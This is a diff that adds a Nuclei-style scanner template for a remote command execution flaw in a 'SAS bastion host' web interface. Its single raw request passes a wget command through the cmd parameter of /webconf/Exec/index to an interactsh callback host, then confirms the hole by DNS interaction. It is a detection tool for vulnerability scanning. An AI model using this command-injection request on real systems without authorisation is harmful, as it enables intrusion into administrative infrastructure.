@@ -1,0 +1,22 @@
+id: poc-yaml-lvmeng-sas-exec-rce
+info:
+  name: SAS Bastion Host Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+http:
+  - raw:
+      - |
+        GET /webconf/Exec/index?cmd=wget%20{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: status
+        status:
+          - 200
